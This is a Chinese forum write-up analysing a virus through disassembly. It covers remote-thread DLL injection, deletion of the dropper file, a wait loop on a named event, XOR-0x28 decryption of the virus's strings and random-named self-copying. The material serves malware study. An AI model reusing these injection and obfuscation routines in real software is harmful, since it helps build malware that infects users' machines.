
# 汇编代码与反汇编分析

## 1. 创建远线程与资源释放

以下代码段展示了如何创建远线程，随后释放内存并返回上层调用。

```asm
0040160E          push    [ebp+lpStartAddress] ; lpStartAddress  
00401611          push    400h                 ; dwStackSize  
00401616          push    eax                  ; lpThreadAttributes  
00401617          push    [ebp+hObject]         ; hProcess  
0040161A          call    ds:CreateRemoteThread ; 创建远线程到目标进程，线程函数和参数已经写入目标进程  
00401620          mov     [ebp+var_1C], eax  

  远线程创建完毕，释放内存，返回上层调用。  

00401623          push    ebx                  ; dwSize  
00401624          push    esi                  ; lpAddress  
00401625          push    [ebp+hProcess]        ; hProcess  
00401628          call    FreeMemory  

00401628  

0040162D          push    ebx                  ; dwSize  
0040162E          push    [ebp+var_C]          ; lpAddress  
00401631          push    [ebp+hProcess]        ; hProcess  
00401634          call    FreeMemory  

00401634  

00401639          add     esp, 18h  

00401639  

0040163C          push    [ebp+hObject]         ; hObject  
0040163F          call    ds:CloseHandle  
00401645          mov     eax, [ebp+var_1C]  
00401648          pop     edi  
00401649          pop     esi  
0040164A          pop     ebx  
0040164B          leave  
0040164C          retn  
```

## 2. 远线程处理函数分析

`h)` 远线程处理函数分析：调用 `LoadLibraryA` 加载病毒 DLL，然后，调用 DLL 映像基址+`0x30` 所指向的地址处的函数。然后判断 `LoaderPathName` 是否为 `NULL`（从前面可以看到如果 `EXE` 为 `%windir%\upxdnd.exe`，则其为 `NULL`），不为 `NULL`，则删除名称为 `LoaderPathName` 的文件，然后函数调用 `OpenEventA` 打开名为`"51343281"`的事件，除非有新的病毒实例启动创建这个事件，否则该函数在此处一直循环等待，当有新病毒实例运行后，线程函数退出循环，调用 `Dll+0x34` 处所指向的函数，然后释放 DLL，退出远线程。

```asm
004013D9 RemoteThreadProc proc near               ;  
004013D9  

004013D9 var_4            = dword ptr -4  
004013D9 arg_0            = dword ptr  8  
004013D9  

004013D9                 push    ebp  
004013DA                 mov     ebp, esp  
004013DC                 push    ecx  
004013DD                 push    esi  
004013DE                 mov     esi, [ebp+arg_0]  
004013E1                 push    edi  
004013E2                 lea     eax, [esi+18h]  ; LibPathName  
004013E5                 push    eax  
004013E6                 call    dword ptr [esi] ; 加载 LibPathName 所指 DLL  
004013E8                 and     byte ptr [ebp+arg_0+3], 0  
004013EC                 mov     edi, eax  
004013EE                 mov     eax, [edi+30h]  
004013F1                 mov     ecx, [edi+34h]  
004013F4                 test    eax, eax  
004013F6                 mov     [ebp+var_4], ecx  
004013F9                 jz      short loc_401447  
004013F9  

004013FB                 push    ebx  
004013FC                 call    eax             ; 调用 Dll 中的函数(未导出)  
004013FE                 lea     ebx, [esi+11Ch] ; ModuleFileName  
004013FE  

00401404  

00401404                 cmp     byte ptr [ebx], 0  
00401407                 jz      short loc_401419 ;  
00401407  

00401409                 cmp     byte ptr [ebp+arg_0+3], 0  
0040140D                 jnz     short loc_401419 ; "51343281"  
0040140D  

0040140F                 push    ebx  
00401410                 call    dword ptr [esi+4] ; DeleteFileA 删除注入器病毒程序  
00401413                 test    eax, eax  
00401415                 setnz   byte ptr [ebp+arg_0+3] ; 删除标记，重复利用输入参数  
00401415  

00401419  

00401419                 lea     eax, [esi+220h] ; "51343281"  
0040141F                 push    eax  
00401420                 push    0  
00401422                 push    1F0003h  
00401427                 call    dword ptr [esi+8] ; OpenEventA  
0040142A                 test    eax, eax  
0040142C                 jnz     short loc_401435 ; 直到有新的病毒实例创建事件，否则该线程处理函数一直处于循环等待状态  
0040142E                 push    64h  
00401430                 call    dword ptr [esi+0Ch] ; Sleep 100ms  
00401433                 jmp     short loc_401404  
00401433  

00401435 ; ---------------------------------------------------------------------------  
00401435                 push    eax  
00401436                 call    dword ptr [esi+10h] ; CloseHandle Event  
00401439                 call    [ebp+var_4]     ; 调用 Dll+0x34 处所指向的函数  
0040143C                 push    edi  
0040143D                 call    dword ptr [esi+14h] ; FreeLibrary Dll  
00401440                 push    edi  
00401441                 call    dword ptr [esi+10h] ; CloseHandle hDllModule  
00401444                 xor     eax, eax  
00401446                 pop     ebx  
00401446  

00401447                 pop     edi  
00401448                 pop     esi  
00401449                 leave  
0040144A  

0040144A locret_40144A:  
0040144A                 retn    4  
0040144A  

0040144A RemoteThreadProc endp  
```

## 3. 病毒程序中的解密程序

病毒中保存的许多敏感的字符中都是经过加密（其实就是与 `0x28` 异或）存储的，病毒在使用的时候，都是先解密然后再使用的。

```asm
00401979 Decrypt proc near                ; CODE XREF: SetAutoRun+2B p  
00401979                                 ; AntiAV+11 p AntiAV+1D p  
00401979                                 ; AntiAV+29 p  
00401979  

00401979 arg_0            = dword ptr  8  
00401979 arg_4            = dword ptr  0Ch  
00401979  

00401979                 push    ebp  
0040197A                 mov     ebp, esp  
0040197C                 nop  
0040197D                 xor     ecx, ecx  
0040197F                 cmp     [ebp+arg_4], ecx  
00401982                 jle     short loc_401992  
00401982  

00401984  

00401984 loc_401984:                          ; CODE XREF: Decrypt+17 j  
00401984                 mov     eax, [ebp+arg_0]  
00401987                 add     eax, ecx  
00401989                 xor     byte ptr [eax], 28h  
0040198C                 inc     ecx  
0040198D                 cmp     ecx, [ebp+arg_4]  
00401990                 jl      short loc_401984  
00401990  

00401992  

00401992 loc_401992:                          ; CODE XREF: Decrypt+9 j  
00401992                 pop     ebp  
00401993                 retn  
00401993  

00401993 Decrypt endp  
```

---
【版权声明】：本文原创于看雪技术论坛，转载请注明作者并保持文章的完整，谢谢！

2008 年 02 月 26 日 17:15:03

## 4. 随机字符串生成与文件操作分析

```asm
00401194                 push    0Ah  
```

`00401196` `push offset s_Upxdnd_exe` ; `"upxdnd.exe"`  
`0040119B` `call ConvToRandString`  
`0040119B`

### 疑问：`ConvToRandString` 具体是怎么做的？

```asm
004011A8                 mov     dword ptr s_Upxdnd_exe+6, 6578652Eh  
```

这里最好注释一下，实际上是将 `s_Upxdnd_exe` 这个字符串后面改成 `".exe"`。

### 后续代码位置

经过这样的修改后，到了以下位置：

```asm
004011DC                 lea     eax, [ebp+Data]  
004011E2                 push    offset s_Upxdnd_exe ; "upxdnd.exe"  
004011E7                 push    eax             ; char *  
004011E8                 call    strcat  
004011E8  
```

运行时这个 `s_Upxdnd_exe` 的内容已经变成了楼主所说的 `"??"??"?.exe"`，所以注释有问题（注释是 `IDA` 自动生成的），这里注释最好改一下。

只有这样才能理解，为什么接下来调用 `CopyFileA` 的结果，会是 `“拷贝到 windows 目录下并随机命名”`。

这是作为别人在阅读这些反汇编结果的时候会出现的不解之处。
